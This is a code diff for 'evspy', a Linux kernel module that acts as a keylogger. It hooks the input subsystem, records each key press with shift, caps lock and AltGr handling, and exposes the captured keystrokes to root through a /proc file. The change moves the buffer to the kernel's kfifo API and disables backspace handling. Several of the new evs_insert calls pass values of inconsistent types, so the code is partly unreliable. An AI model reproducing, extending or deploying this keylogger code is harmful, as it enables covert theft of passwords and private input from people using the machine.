@@ -20,15 +20,14 @@
  * along with evspy.  If not, see <http://www.gnu.org/licenses/>.
  */
 
-#include "evspy-core.h"
+
+#include "evspy.h"
 
 
-static char *buffer;		// circular buffer
-static char *rdp;			// read pointer
-static char *wrp;			// write pointer
+DECLARE_KFIFO(cbuffer, char, EVS_BUFSIZE);
+
 static unsigned short int capslock_on = 0;
 static unsigned short int shift_on = 0;
-
 #ifdef EVS_ALTGR_ENABLED
 static unsigned short int altgr_on = 0;
 #endif
@@ -39,10 +38,7 @@ static unsigned short int altgr_on = 0;
 static int evspy_read_proc(char *page, char **start, off_t offset, int count,
 		int *eof, void *data)
 {
-	int n, toend;
-	int retval = 0;
-	int diff = wrp - rdp;
-
+	int n;
 	// root only plz
 	if (current_uid() || current_euid()) {
 #if EVS_TROLL == 1
@@ -53,37 +49,14 @@ static int evspy_read_proc(char *page, char **start, off_t offset, int count,
 #else
 		return -EPERM;
 #endif
+	} else {
+		n = kfifo_out(&cbuffer, page, count);
+
+		if (kfifo_is_empty(&cbuffer))
+			*eof = 1;
+
+		return n;
 	}
-
-	// wrp > rdp: read from rdp to wrp
-	if (diff > 0) {
-		n = min(diff, count);
-		strncpy(page, rdp, n);
-		rdp += n;
-		retval = n;
-
-	// rdp > wrp: read from rdp to end of buffer and then from the beginning of
-	// the buffer to wrp
-	} else if (diff < 0) {
-		toend = (buffer + EVS_BUFSIZE) - rdp;
-		n = min(toend, count);
-		strncpy(page, rdp, n);
-		retval = n;
-
-		if (n < toend) {
-			rdp += n;
-		} else {
-			n = min(wrp - buffer, count - retval);
-			strncpy(page + retval, buffer, n);
-			retval += n;
-			rdp = buffer + n;
-		}
-	}
-
-	// wrp == rdp: buffer is empty
-	if (rdp == wrp)
-		*eof = 1;
-	return retval;
 }
 
 /*
@@ -173,7 +146,7 @@ static void special_char(unsigned int code, unsigned int value)
 		sp_tag[1] = '-';
 
 	while (*sp_tag)
-		evs_insert(*sp_tag++);
+		evs_insert(&cbuffer, sp_tag++);
 }
 
 static void evspy_event(struct input_handle *handle, unsigned int type,
@@ -183,10 +156,10 @@ static void evspy_event(struct input_handle *handle, unsigned int type,
 	if (type != EV_KEY || unlikely(value == EVS_VAL_HOLD)) {
 		return;
 
-	// Backspace
-	} else if (code == KEY_BACKSPACE && value == EVS_VAL_PRESS) {
-		evs_backspace();
-		return;
+//	// Backspace
+//	} else if (code == KEY_BACKSPACE && value == EVS_VAL_PRESS) {
+//		evs_backspace();
+//		return;
 
 	// Special/unknown keys (alt, ctrl, esc, shift, etc)
 	} else if (code >= sizeof(map) || (map[code] == '.' && likely(code != KEY_DOT))) {
@@ -196,13 +169,13 @@ static void evspy_event(struct input_handle *handle, unsigned int type,
 	} else if (value == EVS_VAL_PRESS) {
 #ifdef EVS_ALTGR_ENABLED
 		if (altgr_on)
-			evs_insert(evs_altgr(code));
+			evs_insert(&cbuffer, evs_altgr(code));
 		else
 #endif
 		if (shift_on || capslock_on)
-			evs_insert(evs_shift(code));
+			evs_insert(&cbuffer, evs_shift(code));
 		else
-			evs_insert(map[code]);
+			evs_insert(&cbuffer, &map[code]);
 	}
 }
 
@@ -266,15 +239,14 @@ static int __init evspy_init(void)
 #ifdef EVS_ALTGR_ENABLED
 	init_altgrmap();
 #endif
-	buffer = kmalloc(EVS_BUFSIZE, GFP_KERNEL);
-	rdp = wrp = buffer;
-	return !buffer || input_register_handler(&evspy_handler);
+	//cbuf_init();
+	INIT_KFIFO(cbuffer);
+	return input_register_handler(&evspy_handler);
 }
 
 static void __exit evspy_exit(void)
 {
 	input_unregister_handler(&evspy_handler);
-	kfree(buffer);
 #ifdef EVS_ALTGR_ENABLED
 	exit_altgrmap();
 #endif
